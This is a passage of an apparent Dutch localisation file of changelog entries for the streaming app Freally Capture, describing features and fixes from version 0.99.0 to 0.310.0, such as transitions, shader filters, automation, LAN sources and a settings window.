(CAP-N20)</strong> — een nieuwe soort overgang: items die in <em>zowel</em> de uitgaande als de inkomende scène staan (dezelfde bron), bewegen van hun oude positie/schaal/rotatie/bijsnijding naar de nieuwe in plaats van te snijden; items die maar in één scène staan, faden in of uit. Met een smootherstep-versnelling, zodat de beweging soepel op gang komt en rustig tot stilstand komt.","changelog.ccf72b961a2f":"<strong>Overgangsregels (CAP-N21)</strong> — een overgangsmatrix per scènepaar (<strong>Extra → Overgangsregels</strong>): scène A→B kan een eigen soort en duur gebruiken in plaats van de standaard. Plus per item <strong>infaden bij tonen/verbergen</strong> (Transformatie bewerken → Onthullen): een item komt geleidelijk op als het zichtbaar wordt gemaakt. Alle overvloei- en bewegingsovergangen verlopen nu met versnelling en vertraging.","changelog.cd2edf9cde0e":"<strong>Shaderstudio (CAP-N22)</strong> — schrijf een <strong>eigen WGSL-effect</strong> als filter: het wordt tijdens het draaien gecompileerd en gevalideerd (een ongeldige shader wordt genegeerd — de bron wordt zonder filter weergegeven, nooit een crash), met schuifregelaars die automatisch uit <code>// @param</code>-annotaties worden gegenereerd, live bewerken en een ingebouwde galerij (grijswaarden, inverteren, scanlijnen, vignet).","changelog.51dd65cc8ab0":"<strong>Bézier-masker (CAP-N28)</strong> — een filter voor een <strong>vrij getekend masker</strong>: teken een gesloten pad (sleep de handgrepen, dubbelklik om toe te voegen, klik met rechts om te verwijderen), met vooraf ingestelde vormen, verzachting per rand en inverteren. Exporteer elk pad als grijswaardenpatroon voor een <strong>luma-wipe</strong> voor een overgang die een vorm onthult.","changelog.1e693f57a778":"<strong>Track-matte-stingers (CAP-N29)</strong> — een stinger kan zijn transparantie meedragen als <strong>track matte</strong> (vulling en matte <strong>naast elkaar</strong> of <strong>gestapeld</strong> verpakt), zodat alfa per pixel codecs overleeft die het weggooien (H.264/HEVC). Optioneel wordt <strong>het programmageluid geduckt</strong> onder het eigen geluid van de stinger zolang die speelt.","changelog.646680d87464":"<strong>Help → Website bezoeken en Helpportaal deden niets.</strong> Deze menulinks (en dezelfde links in het dialoogvenster Over) rekenden erop dat de webview <code>target=&quot;_blank&quot;</code> opende, wat deze Tauri-build nooit doet. Ze openen nu de browser van het besturingssysteem via de gecontroleerde opener van de app — <strong>Website bezoeken</strong> → de startpagina, <strong>Helpportaal</strong> → de documentatiepagina.","changelog.e322c5f672ae":"[0.310.0] — 2026-07-14 (Compositor &amp; FX in de diepte — fase 3, deel 1)","changelog.2d984c4daa81":"De eerste helft van fase 3 (Compositor &amp; FX in de diepte): beweging en effecten bereiken het canvas — nieuwe vervagingsstijlen, een 3D-kanteling, stilstaand beeld, bronnen klonen in één klik, en <strong>downstream-keyers</strong> zoals in de omroepwereld, die boven elke scène liggen. Plus de drie reparaties die tegen 0.301.0 waren gemeld — waaronder een projectorfout die het hele bureaublad kon laten vastlopen.","changelog.dbef37c22c9b":"<strong>Vervagingsfamilie (CAP-N27)</strong> — vier nieuwe GPU-filters naast de Gaussische vervaging: <strong>richting</strong> (een bewegingsstreep langs een hoek), <strong>radiaal</strong> (draaiing rond een middelpunt), <strong>zoom</strong> (een dolly-zoomstreep) en <strong>pixeleren</strong> (mozaïek). Elk is één geplande pass met golden-frame-tests.","changelog.1647ee3fae6b":"<strong>3D-/perspectieftransformatie (CAP-N23)</strong> — een item kan in 3D kantelen: <strong>Kantelen X</strong>, <strong>Kantelen Y</strong> en een sterkte voor <strong>Perspectief</strong> in Transformatie bewerken. Een gewone (niet gekantelde) transformatie wordt pixel voor pixel identiek weergegeven — de projectieve matrix wordt alleen gebruikt als er een kanteling is toegepast.","changelog.ebaba11b62a2":"<strong>Filter voor stilstaand beeld (CAP-N25)</strong> — voeg een filter <strong>Bevriezen</strong> aan een bron toe en die houdt zijn laatste frame vast; programma, voorbeeld, opname en stream bevriezen allemaal tegelijk. Zet het filter uit om weer verder te gaan.","changelog.e1ac0ba4a7ba":"<strong>Bron klonen (CAP-N26)</strong> — een knop <strong>Klonen</strong> op elke bronregel (⧉): één bron, veel looks. Dezelfde bron kan in meerdere scènes of op meerdere plekken staan, elk item met een eigen transformatie en filterstapel (de engine koppelde filters al per item; dit maakt het één klik).","changelog.d223f64ff4d4":"<strong>Downstream-keyers (CAP-N24)</strong> — blijvende overlaylagen die op de <strong>programma-uitvoer</strong> worden gecomponeerd, boven elke scène, en scènewissels overleven (een zenderlogo, een LIVE-badge, een lower third). Een nieuw paneel <strong>Extra → Downstream-keyers</strong> beheert ze: voeg elke bron toe, wijzig de volgorde, dekking, positie/grootte en aan/uit per laag. Ze worden net zo goed in voorbeeld, opname, stream en multiview weergegeven.","changelog.c53ca5aa04c7":"<strong>Wat is er nieuw</strong> opent nu het wijzigingslog van de draaiende build <strong>in de app</strong> (dezelfde alleen-lezenweergave van de notities die de updater gebruikt) in plaats van in een browsertabblad — offline, en altijd de notities die bij de versie horen.","changelog.a41f1b775b16":"<strong>Vrije schijfruimte in het statistiekendock</strong> — een live tegel <strong>Schijf</strong> toont de vrije ruimte op het opnamestation, en tijdens het opnemen schat een tegel <strong>Opn. resterend</strong> de tijd tot het station vol is bij de huidige schrijfsnelheid (dezelfde eerlijke schatting die rekening houdt met <code>.frec</code> en die ook de waarschuwing bij weinig schijfruimte gebruikt). Zo zie je hoeveel ruimte er nog is terwijl je opneemt of streamt.","changelog.266a45108853":"<strong>Projector openen liet het hele bureaublad vastlopen.</strong> Bij het openen van een projector op een beeldscherm vroeg de app het besturingssysteem <em>tijdens het aanmaken van het venster</em> om exclusief volledig scherm op het primaire beeldscherm, waardoor de gebeurtenislus van Windows vastliep — het bureaublad bevroor en de app moest via Taakbeheer worden beëindigd. Projectoren zijn nu een <strong>randloos venster ter grootte van de gekozen monitor</strong> (wat de „projector op volledig scherm” van OBS in werkelijkheid is): geen moduswissel van DWM, en Esc / Alt+F4 / de taakbalk blijven allemaal werken.","changelog.5f6fa8c04556":"<strong>De OBS-scèneimport koos de camera niet.</strong> Een Video Capture Device dat uit OBS werd geïmporteerd, kwam uit op „(huidig apparaat)” zonder dat er iets geselecteerd was — de importer liet het apparaat van OBS volledig vallen. Hij neemt nu de leesbare apparaatnaam van OBS mee en zoekt bij het importeren de bijbehorende camera op deze machine op.","changelog.7dca8f4d0d7f":"[0.301.0] — 2026-07-14 (Menubalk &amp; venster Instellingen)","changelog.080821dda5da":"Een vensteropbouw voor de desktop-app, in de vorm van OBS maar helemaal van Freally: een echte <strong>menubalk</strong> bovenaan en een <strong>venster Instellingen met zijbalk</strong> met OK / Annuleren / Toepassen — zodat het dock Bediening weer live bediening is in plaats van een muur van startknoppen.","changelog.8a7238deca0a":"<strong>Menubalk van de app</strong> — Bestand · Bewerken · Beeld · Docks · Profiel · Scèneverzameling · Extra · Help, bovenaan het venster. Het is puur een doorgeeflaag over acties die al bestonden (die van het opdrachtenpalet), dus onder de motorkap gebeurt er niets nieuws — de startknoppen hebben nu gewoon een thuis. Bestand bereikt Opnamen tonen / Hermuxen / Instellingen / Map met instellingen tonen / Afsluiten; Bewerken heeft ongedaan maken/opnieuw en transformatie en filters kopiëren/plakken; Extra verzamelt automatisering, draaiboek, sneltoetsenkaart, A/V-synchronisatie, scripts, componenten, MIDI, PTZ, de API voor bediening op afstand en het LAN-paneel; Profiel en Scèneverzameling wisselen tussen opgeslagen sets; Help opent de documentatie, het wijzigingslog, een bugmelding en de controle op updates. De vervolgkeuzemenu's zijn met het toetsenbord te bedienen (pijltoetsen tussen en binnen menu's) en hebben labels voor schermlezers; items voor functies die nog niet bestaan, zijn aanwezig maar uitgeschakeld.","changelog.0a8800013b15":"<strong>Venster Instellingen in OBS-stijl</strong> — een zijbalk links met categorieën (<strong>Algemeen · Weergave · Streamen · Uitvoer · Replay · Sneltoetsen · Netwerk · Toegankelijkheid · Over</strong>) met een gegroepeerd, scrollbaar deelvenster en onderaan <strong>OK / Annuleren / Toepassen</strong>. <strong>Er verandert niets totdat je op Toepassen (of OK) klikt:</strong> het venster bewerkt een privékopie, Toepassen is grijs totdat je echt iets wijzigt, en Annuleren/Escape zet precies terug wat je had — thema en accentkleur zijn live te zien zolang het venster open is, maar worden bij annuleren teruggedraaid, zonder sporen. Een fout per categorie verschijnt in de tekst, met een stip bij die categorie in de zijbalk.","changelog.0b27c918454f":"<strong>Sneltoetsen koppelen zonder conflicten</strong> — de categorie Sneltoetsen koppelt elke actie via een <strong>vervolgkeuzelijst met zorgvuldig gekozen sneltoetsen</strong>, niet via een tekstvak. Kies je een sneltoets voor de ene actie, dan verdwijnt die uit het menu van elke andere actie, zodat twee functies nooit dezelfde toets kunnen hebben; <strong>Geen</strong> ontkoppelt hem en zet hem terug in de pool. Een filtervak maakt de lijst korter. Vrije tekstinvoer is helemaal verdwenen, en de backend weigert misvormde sneltoetscombinaties nu structureel, zodat een onzinnige koppeling zelfs met handmatig bewerken niet kan worden opgeslagen.","changelog.757f7265a0b3":"<strong>Toegankelijkheid: kleuren van de mixermeters</strong> — de nieuwe categorie Toegankelijkheid stelt de kleuren van de banden van de VU-meters in, met een <strong>voorinstelling die veilig is voor kleurenblinden</strong> (Okabe-Ito) naast Standaard en een optie Aangepast.","changelog.bc44a26e0073":"<strong>Mappen snel openen</strong> — Bestand → Opnamen tonen / Map met instellingen tonen openen de eigen mappen van de app in de bestandsbeheerder (een eigen opdracht, nooit een ruw pad uit de webview).","changelog.a8559338a320":"<strong>Het dock Bediening is nu alleen bediening.</strong> Alle 18 knoppen die dialoogvensters openden (Instellingen, Uitvoer, Stream, Docks, Profielen, Scripts, Automatisering, Bug melden, Controleren op updates, …) zijn naar de menubalk verhuisd; het dock houdt alleen wat de uitzending aanstuurt — Opname starten/stoppen, Ga live, Replay activeren, de paniekknop, Studiomodus en overgangen. De meldingen voor een crashrapport en een beschikbare update verschijnen bij het starten nog precies zoals voorheen.","changelog.2ce026bd331e":"[0.300.1] — 2026-07-14 (De vereenvoudigingsronde van fase 2)","changelog.82f024d54659":"Geen nieuwe functies: een opruimreview vanuit vier invalshoeken (hergebruik / vereenvoudiging / efficiëntie / abstractieniveau) van de wijzigingen in 0.300.0, doorgevoerd. Eén zichtbare reparatie ging mee: de <strong>gezichtscompositor van de invoer-overlay</strong> gebruikte nog de alfamenging van vóór de reparatie, dus randen van tekens die over transparantie werden getekend, kwamen iets te donker uit — hij deelt nu de gecorrigeerde <code>compose::blit</code> met elke andere bron die een eigen weergave tekent.","changelog.5d482d56004f":"<strong>Gedeeld wat 0.300.0 bouwde en daarna omzeilde.</strong> De vier zelfgeschreven alfablits roepen nu één compositor aan; de begrenzing bij het zoeken, het decoderen van audiosamples en de watchdog voor kindprocessen staan één keer in <code>media.rs</code> (media, afspeellijst, replay en LAN-ontvangst gebruiken ze allemaal); de vier zwakke sessieregisters zijn één <code>WeakRegistry</code>; de grammatica voor <code>{{variable}}</code> is ÉÉN functie die titels en de automatiseringsengine delen (ze kunnen niet meer uit elkaar groeien); het formulier voor LAN-ontvangst, de QR-renderer, de standaardwaarden voor titellagen en de optietabellen zijn gedeelde UI-modules; de LAN-IP-controle, de JPEG-encoder van de Link-zender en het willekeurig afspelen van de afspeellijst roepen allemaal de helpers aan die al bestonden in plaats van kopieën mee te dragen.","changelog.9f9c71653770":"<strong>Realtime-hygiëne.</strong> De visualisatie-aftakking van de mixer reserveert niet meer per blok van 10 ms geheugen; de zender van Freally Link schrijft frames als header-en-daarna-payload in plaats van elk JPEG-programmaframe naar een tussenbuffer te kopiëren; de splittimer berekent zijn vergelijkingskolom één keer per sessie in plaats van bij elke hertekening; de statuscontrole van de LAN-ontvangst zet de bron-id niet meer bij elk verwerkt frame opnieuw om naar een string.","changelog.b393d51bd0f8":"Diverse dode onderdelen verwijderd (een ongelezen gamepadveld, ongebruikte derives, te openbare helpers) en de argumentprologen en probes voor ffmpeg in de decodeermodule ontdubbeld — byte voor byte dezelfde opdrachten, één keer vastgelegd.","changelog.b1d50dd41d90":"<strong>Het Windows-installatieprogramma maakt nu een snelkoppeling op het bureaublad.</strong> De NSIS-sjabloon van Tauri maakt alleen een item in het startmenu en biedt geen optie voor een snelkoppeling op het bureaublad, dus geen enkele installatie zette ooit een pictogram op het bureaublad — de hooks van het installatieprogramma maken nu bij elke installatie <code>Freally Capture.lnk</code> aan (met het eigen pictogram van de app) en verwijderen die bij het verwijderen.","changelog.45faf29e220b":"<strong>Uitlijnhulplijnen zijn nu met één klik te wissen.</strong> Een hulplijn verwijderen betekende een lijn van 1 pixel van het canvas slepen — precisiewerk waarbij je bij een misser juist een item gaat slepen (waarvan de magenta uitlijnlijnen dan lijken op „er is een nieuwe hulplijn verschenen”, een echte melding). De werkbalk voor hulplijnen krijgt een knop <strong>Alle hulplijnen wissen</strong>, en de grijpzone rond elke hulplijn is breder.","changelog.cb705b484db4":"[0.300.0] — 2026-07-14 (Nieuwe bronnen &amp; overlays — CAP-N fase 2)","changelog.3d36dd2cf7da":"<strong>Tien nieuwe dingen om op het canvas te zetten — allemaal lokaal.</strong> Directe herhaling speelt de buffer <em>in</em> de show af, een naadloze media-afspeellijst vervangt de mediabron die „één bestand tegelijk” deed, titels en scoreborden krijgen een echte ontwerper met lagen en live bediening, en het canvas krijgt er een audiovisualizer, een prestatie-HUD, een speedrun-splittimer, een invoer-overlay en cursoreffecten bij. Twee LAN-bronnen maken het af: een SRT-/RTMP-listener zodat een telefoon of tweede pc een scène kan voeden, en <strong>Freally Link</strong>, een eigen manier om tussen instanties te delen waarvoor aan geen van beide kanten ffmpeg nodig is.","changelog.a446e2cc5c22":"<strong>De netwerkregel blijft overeind:</strong> beide LAN-functies staan <strong>uit totdat je ze toevoegt</strong>, binden alleen aan de lokale machine en raken het internet nooit. Niets zoekt, niets belt naar buiten, en de app zegt dat in elke taal. De invoer-overlay en de cursoreffecten lezen invoer <strong>alleen zolang ze ingeschakeld zijn</strong> en loggen of bewaren nooit een toetsaanslag.","changelog.69585a9a3335":"<strong>Bron voor het afspelen van directe herhalingen</strong> (CAP-N10). Speel de geactiveerde replaybuffer rechtstreeks in het programma af: een sneltoets legt de laatste N seconden vast (stream-copy — geen nieuwe codering) en speelt ze af op 100 / 50 / 25 %, <strong>in de tijd uitgerekt, nooit met geïnterpoleerde frames</strong>. Spoel en pauzeer terwijl hij speelt; aan het eind wordt de bron weer transparant, zodat de show vanzelf terugkeert naar live. <em>Slow motion is bewust zonder geluid — uitgerekt geluid zou uitsmeren, en dat doen we niet na.</em>","changelog.beabb5e2e26f":"<strong>Bron voor LAN-ontvangst</strong> (CAP-N11). Een ingebouwde <strong>SRT-/RTMP-listener</strong>: richt een camera-app op een telefoon, een encoder of een tweede pc op de URL (getoond met een QR-code) en het beeld komt in een scène terecht met een eigen mixerkanaal. Uit totdat je hem toevoegt, bindt alleen aan de lokale machine, nooit aan het internet. SRT heeft een optionele wachtwoordzin (AES); <em>RTMP heeft zelf geen authenticatie — het formulier zegt dat en geeft de voorkeur aan SRT.</em>","changelog.26a004c0fb53":"<strong>Freally Link</strong> (CAP-N12). Twee Freally-instanties op één LAN: zet op de verzendende machine de Link-uitvoer aan en stel de <strong>koppelsleutel</strong> in (zonder sleutel kan de uitvoer niet worden ingeschakeld), druk op de ontvangende machine op <strong>LAN scannen</strong>, typ de sleutel en het programma verschijnt als bron — van game-pc naar encodeer-pc, of een monitor in een overloopzaal. Een ontvanger die de sleutel niet kan tonen, ziet nooit een frame (vergelijking in constante tijd, een eerlijke foutmelding „geweigerd” in plaats van een lus van nieuwe pogingen). Een eigen, zelfgeschreven protocol en mDNS-detectie: <strong>aan geen van beide kanten is ffmpeg nodig</strong>, geen broker, geen server.","changelog.d57b39d01af7":"<strong>Bron voor invoer-overlay</strong> (CAP-N13). Live weergave van toetsenbord, muis en gamepad met vier indelingen (WASD, compact toetsenbord, pad met twee sticks, 8-weg fightstick) — ingedrukte toetsen lichten op, klikken flitsen, sticks en triggers bewegen. <strong>Leest invoer alleen zolang de bron ingeschakeld is, en logt of bewaart nooit iets.</strong> Toetsenbord en muis werken eerst op Windows (dat staat eerlijk in het product); gamepads werken op alle drie de besturingssystemen.","changelog.230d75e66779":"<strong>Bron voor systeemstatistieken-overlay</strong> (CAP-N14). De <em>echt gemeten cijfers</em> van het statistiekendock — fps, CPU, geheugen, GPU-compositietijd, verloren frames en live bitrate — gecomponeerd voor je kijkers, met een schakelaar per regel. <em>GPU-gebruik ontbreekt bewust: we meten het niet, dus we gokken het ook niet.</em>","changelog.7d975b57ccd9":"<strong>Bron voor audiovisualizer</strong> (CAP-N15). Klassieke FFT-spectrumbalken, een oscilloscoop of stereo-VU-meters, gekoppeld aan een mixerkanaal, een spoorbus of de mastermix. Afgetapt <strong>na de fader</strong> — een gedempte bron wordt plat weergegeven, precies zoals hij klinkt. Eigen radix-2-FFT; nergens ML.","changelog.dcc7f22ee0b8":"<strong>Ontwerper voor titels &amp; scoreborden</strong> (CAP-N16). Sjablonen met lagen (tekst, afbeelding, vorm) met tekst met omlijning en slagschaduw, in- en uitanimaties (vervagen, schuiven, wipe), velden gekoppeld aan een gevolgd bestand (CSV-cel, JSON-pointer) of een studiovariabele, en live bediening — wissel een naam, bewerk de stand, start de animatie — zonder de scène aan te raken.","changelog.977703b6d007":"<strong>Bron voor media-afspeellijst</strong> (CAP-N17). Een geordende afspeellijst die <strong>echt naadloos</strong> afspeelt (de hele getrimde lijst loopt door één decodering, dus de overgangen tussen items zijn framenauwkeurig), met in- en uittrims en cuepunten per item, herhalen / willekeurig / laatste vasthouden, sneltoetsen voor volgende en vorige, en een variabele „nu speelt” die elke tekstbron kan tonen.","changelog.ded0bd268198":"<strong>Bron voor speedrun-splittimer</strong> (CAP-N18). Importeer een LiveSplit-bestand <code>.lss</code> en draai het: vergelijkingen met je persoonlijk record, beste segmenten of gemiddelde, markering van gouden segmenten, en globale sneltoetsen voor splitsen / ongedaan maken / overslaan / resetten. Het bestand wordt <strong>alleen gelezen</strong> — een run wordt nooit teruggeschreven. <em>Autosplitters die procesgeheugen lezen, worden bewust niet ondersteund (te dicht bij anti-cheat); splitsen gaat via bestand en sneltoets.</em>","changelog.c303cbf74e59":"<strong>Cursormarkering &amp; klikeffecten</strong> (CAP-N19). Een cursorhalo, klikgolven met een kleur voor links en rechts, en optionele toetsweergave, getekend op beeldscherm- en vensteropnames — basisuitrusting voor wie tutorials maakt, via het eigen cursorpad. Eerlijk gezegd alleen op Windows (macOS en Linux componeren hun eigen cursor); toetsaanslagen worden getekend, nooit gelogd.","changelog.f998b484bc62":"<strong>Sharp-bilinear-schaling was waziger dan gewone bilineaire schaling</strong> (regressie in CAP-N70 van 0.200.0). De shader mat de <em>randen</em> van texels in plaats van de middelpunten, dus het grootste deel van elke texel viel in de 50/50-overgang. Hij houdt nu het middelpunt van elke texel vast en gaat binnen een smalle naad over naar de buur, en daar is deze modus voor bedoeld. De nieuwe golden-frame-tests per schaler (al openstaand sinds 0.200.0) leggen het vast.","changelog.e64eb694c7c5":"Opmerking over de verpakking","changelog.7a371e20c4e6":"<strong>De Windows-MSI heeft intern ProductVersion <code>0.230.0</code>.</strong> Windows Installer begrenst de minor-versie van een MSI op 255, en de trede 0.300.0 gaat daarboven — de eerste versie waarin het schema „+100 per fase” die grens raakt. De omzetting is <code>MSI minor = 200 + app-minor ÷ 10</code> (0.400.0 → <code>0.240.0</code> … 0.900.0 → <code>0.290.0</code>, daarna 1.0.0 → <code>1.0.0</code>), strikt oplopend zodat MSI-upgrades oudere installaties blijven vervangen. Alleen de interne versie van de MSI wijkt af: de app, het NSIS-installatieprogramma, de updater en Over zeggen allemaal <strong>0.300.0</strong>.","changelog.04f0b1865198":"[0.200.0] — 2026-07-13 (Automatisering + opname &amp; apparaten in de diepte — CAP-N fasen 1 &amp; 9)","changelog.685bf42fe455":"Twee fasen met elk een eigen thema in één versie, dus het versienummer gaat twee treden omhoog (0.99.0 → 0.200.0). <strong>Fase 1 — Automatisering</strong> laat de studio zichzelf besturen: een regelengine, macro's met variabelen, MIDI- en OSC-bedieningspanelen, sneltoetsakkoorden en -lagen, een aanraakpaneel op het LAN, een tally-lampjesdienst, bediening van PTZ-camera's en een getimed draaiboek voor de show. <strong>Fase 9 — Opname &amp; apparaten in de diepte</strong> maakt het pad van lens tot canvas af: een passthrough-monitor met lage latentie, pixelperfecte schaling, punch-in-zoom, automatisch bijsnijden van zwarte balken, automatisch koppelen van venster en app-geluid, en tonemapping van HDR naar SDR. Verschijnt samen met de <strong>scèneachtergrond</strong> en <strong>echt achteruit afspelen van media</strong>, die eerder in de cyclus zijn gebouwd.","changelog.79232fa7e8c0":"<strong>Alle automatisering deelt één ontwerpregel:</strong> elke regel, macro, MIDI-pad, OSC-adres, paneelknop en draaiboekstap gaat via één vaste toegestane lijst met opdrachten — dezelfde die de WebSocket-API voor bediening op afstand aanbiedt. Geen enkel bedieningsonderdeel kan een bestand noemen, een proces starten of het internet bereiken, <strong>door de opbouw zelf</strong>, en elk netwerkonderdeel staat standaard uit en bindt aan loopback, tenzij LAN uitdrukkelijk is ingeschakeld.","changelog.9bb9593116bc":"<strong>Scèneachtergrond / wallpaper.</strong> Zet een afbeelding, herhalende GIF of herhalende video achter de opname vast als achtergrond over het hele canvas of over een half scherm (links / rechts / boven / onder), waarbij de opname automatisch in de andere helft wordt geplaatst. Zoom met het muiswiel op de opname of de achtergrond, een realtime filter Spiegelen, een modus „vasthouden tot de opname start” met een voorbeeld vóór de opname, en een schakelaar om te verbergen/tonen, zodat een tutorialvideo over het hele beeld kan spelen voordat de opname terugkomt.","changelog.3cc0eae313a7":"<strong>Echt achteruit afspelen van media + volledige transportbediening.</strong> Een echte achterwaartse render (met begrensd geheugen, in segmenten, gecachet) plus spoelen, zoeken vanaf elke plek, afspelen/pauzeren en een schakelaar voor herhalen — een achtergrondvideo gedraagt zich als een gewone speler, op het teken van de operator.","changelog.e9af708a1747":"<strong>Regelengine voor automatisering</strong> (CAP-N01). Negen triggers die op een verandering reageren — scènewissel, streamstatus, opnamestatus, bronfout, een audioniveau dat een grens passeert, systeem inactief, vensterfocus, tijdstip van de dag en een gevolgd bestand dat verandert — begrensd door voorwaarden (een variabele is gelijk aan, streamen, opnemen) die studioacties uitvoeren. Elke regel staat bij levering <strong>uitgeschakeld</strong>; de engine doet niets totdat er één wordt aangezet.","changelog.cdab0d32015e":"<strong>Macro's, variabelen &amp; reeksen</strong> (CAP-N02). Benoemde reeksen van stappen (een actie uitvoeren, wachten, een variabele instellen) met een aantal herhalingen en een optionele globale sneltoets, uit te voeren vanuit de UI, een sneltoets, een regel of de API voor bediening op afstand. Studio<strong>variabelen</strong> vullen <code>{{name}}</code> in elke tekstbron in en werken die live bij zodra een macro de waarde instelt.","changelog.d7decf42ec57":"<strong>MIDI-bedieningspanelen</strong> (CAP-N03). Leer met MIDI-learn een pad, knop of fader aan een studioactie, macro, scènewissel, mixerfader of dempknop, met <strong>feedback via leds en gemotoriseerde faders</strong> die de echte toestand van de studio weerspiegelt (de REC-pad brandt omdat je aan het opnemen bent). Er gaat geen MIDI-poort open totdat je er een kiest.","changelog.3f509d62695d":"<strong>OSC-bediening</strong> (CAP-N04). Controllers in de klasse van TouchOSC en lichttafels besturen de studio via Open Sound Control — <code>/scene/switch</code>, <code>/record/start</code>, <code>/macro/run</code>, <code>/mixer/vol</code> en meer. Standaard uit, loopback tenzij LAN. <em>OSC heeft zelf geen authenticatie — de LAN-schakelaar zegt dat.</em>","changelog.e19b0ee81809":"<strong>Sneltoetsakkoorden &amp; -lagen</strong> (CAP-N05). Akkoorden van twee aanslagen (<code>Ctrl+K, 3</code>), waarbij de losse tweede toets alleen wordt opgeëist zolang het akkoord nog openstaat, plus blijvende lagen, zodat een klein toetsenbord veel acties kan aansturen.","changelog.012efed7e76a":"<strong>Aanraakpaneel op het LAN</strong> (CAP-N06). De app levert een bedieningspagina — scèneknoppen met live tally, mixerfaders en actietoetsen — aan elke telefoon op het netwerk, te bereiken via een QR-code. Standaard uit, een wachtwoord bij elk verzoek, loopback tenzij LAN, en de pagina is ingebouwd (er wordt niets van het internet opgehaald).","changelog.6784a15679f3":"<strong>Tally-lampjesdienst</strong> (CAP-N07). Een rood/groene tallypagina op volledig scherm die elke reservetelefoon kan tonen; <code>?scene=NAME</code> volgt één scène, anders volgt hij de livestatus van het programma.","changelog.0b65086c92dd":"<strong>Bediening van PTZ-camera's</strong> (CAP-N08). Pan / tilt / zoom van camera's via VISCA-over-IP met benoemde voorinstellingen en automatisch terughalen per scène (een scène die naar het programma gaat, haalt het gekoppelde shot terug). Alleen LAN; een camera bestaat alleen omdat zijn adres is ingevoerd — er wordt niets automatisch gevonden.","changelog.23f2bea95258":"<strong>Draaiboek van de show</strong> (CAP-N09). Een geordende lijst van stappen — een scène en hoe lang die blijft staan, plus optionele acties — met handmatig of automatisch doorgaan en een live „hierna + resterende tijd”. Een draaiboek draaien wisselt scènes op de gewone manier, die ongedaan te maken is; het bewerkt nooit de scèneverzameling.","changelog.2e60fbc8afc7":"<strong>Passthrough-monitor met lage latentie</strong> (CAP-N69). Een projector die de <strong>ruwe</strong> frames van een opnameapparaat toont — geen scènes, geen filters, geen compositor — met een gemeten latentie van opname tot weergave, zodat je een gamebeeld van een capture-kaart met minimale vertraging kunt bekijken.","changelog.0e3a7f16e7d8":"<strong>Pixelperfecte schaalmodi</strong> (CAP-N70). Per item vloeiende, nearest-neighbor-, op gehele getallen afgestemde of sharp-bilinear-schaling — retro- en pixelartbeelden bereiken het canvas zonder vervaging.","changelog.ffa3f0ee68cd":"<strong>Punch-in-zoom &amp; meepannen</strong> (CAP-N71). Zoom met het wiel in op elke opname met een kritisch gedempte animatie, drie voorinstellingen op sneltoetsen en een optionele volgmodus die de cursor volgt.","changelog.d331c3ab49e3":"<strong>Zwarte balken automatisch bijsnijden</strong> (CAP-N72). Herken en snijd letterbox- en pillarboxbalken van een bron weg, eenmalig of doorlopend terwijl de beeldverhouding van de inhoud verandert.","changelog.c5425a9fc61b":"<strong>Venster en app-geluid automatisch koppelen</strong> (CAP-N73). Neem het applicatiegeluid van een venster samen met het venster op; het venster verbergen dempt het gekoppelde kanaal en het tonen zet het weer aan — zonder ooit een handmatige demping te overschrijven.","changelog.372de0cef652":"<strong>Tonemapping van HDR naar SDR bij opname</strong> (CAP-N74). Breng de uitvoer van een HDR-beeldscherm over naar het SDR-canvas (afkappen / tintbehoudend maxRGB / Reinhard / BT.2408-knie) met een instelbaar papierwitniveau, live per beeldscherm af te stemmen zonder de opname opnieuw te starten.","changelog.1ee387582d9c":"Beveiliging &amp; betrouwbaarheid","changelog.647e3c52982e":"Alle automatisering loopt via de gedeelde toegestane lijst van de API voor bediening op afstand (<code>ALLOWED_COMMANDS</code>), dus geen regel, macro, MIDI-/OSC-koppeling, paneelknop of draaiboekstap kan een opdracht bereiken die de eigen knoppen van de app niet bereiken — gecontroleerd door een test die zorgt dat de lijst en de bijbehorende afhandeling niet uit elkaar kunnen groeien.","changelog.3ebb5ae804a8":"De trigger <code>FileChanged</code> respecteert de bestaande beveiliging tegen externe paden, dus het volgen van een bestand tast nooit een UNC-pad af (geen lek van NTLM-inloggegevens).","changelog.894554d366f3":"Beide LAN-bedieningsonderdelen (paneel, OSC) waarschuwen in de instellingen dat LAN-verkeer niet versleuteld is voordat de poort voor het netwerk opengaat.","changelog.f8d204cd91ea":"[0.99.0] — 2026-07-12 (Bronnen, apparaten &amp; kalibratie — CAP-M reeks 3)","changelog.26f64316b751":"De derde en laatste reeks must-haves: alles tussen de lens en het canvas. Ingebouwde testsignalen en een begeleide werkbank voor A/V-synchronisatie om de hele keten te kalibreren; bronnen voor timers/klokken en tekst uit een bestand voor shows die op gegevens draaien; een sneltoetsenkaart die elke koppeling controleert; de ontbrekende functies van de mixerconsole; en echte diepgang bij apparaten — deïnterlacing en camerabediening op alle platforms met profielen per apparaat.","changelog.bc670f3d3c34":"<strong>Testsignaalbronnen</strong> (CAP-M21). Kleurbalken in SMPTE-stijl, een kalibratieraster/kruisarcering, een bewegingssweep, de lineup-toon van 1 kHz (−20 dBFS) en een gecombineerd patroon <strong>flits+piep voor A/V-synchronisatie</strong>, gegenereerd vanuit één klok — controleer scènes, encoders, projectoren en streambestemmingen zonder dat er een camera is aangesloten.","changelog.5c359f960e3e":"<strong>Een werkbank voor kalibratie van A/V-synchronisatie</strong> (CAP-M20). Een begeleide tool die het flits+piep-patroon via je beeldscherm en luidsprekers afspeelt, kijkt hoe je camera en microfoon het weer opvangen, de afwijking meet met pure signaalverwerking (detectie van aanzetten over meerdere cycli, met eerlijke hulp bij mislukking — donkere kamer, stille microfoon, ruimtegeluid dat niet het patroon is) en aanbiedt het resultaat toe te passen op de synchronisatieverschuiving van de microfoon. De handmatige schuifregelaar blijft als terugvaloptie. Eerlijk over de lus: de latentie van je beeldscherm en luidsprekers is onderdeel van wat er wordt gemeten.","changelog.5f3aaabe7c80":"<strong>Timer- &amp; klokbronnen</strong> (CAP-M15). Een familie tekstbronnen: wandklok (strftime-formaten + vaste UTC-verschuiving), aftellen (tot een duur of de volgende kloktijd, met een actie bij nul — de weergave laten flitsen of van scène wisselen), een oplopende stopwatch, en tijd sinds live / sinds de opname. Starten/pauzeren/resetten vanuit de eigenschappen van de bron of met twee nieuwe globale sneltoetsen (alle timers tegelijk). Weergaven worden alleen opnieuw getekend als hun tekst verandert.","changelog.e4a01e4da67e":"<strong>Tekst uit een bestand + gegevenskoppeling</strong> (CAP-M16). Een tekstbron kan worden gekoppeld aan een gevolgd lokaal bestand: de hele <code>.txt</code>, één CSV-cel (kolomnaam of index) of één JSON-waarde (RFC 6901-pointer) — binnen een halve seconde na een wijziging opnieuw gelezen, en bestand tegen editors die atomisch schrijven (tijdelijk bestand + hernoemen) doordat de laatste goede waarde in beeld 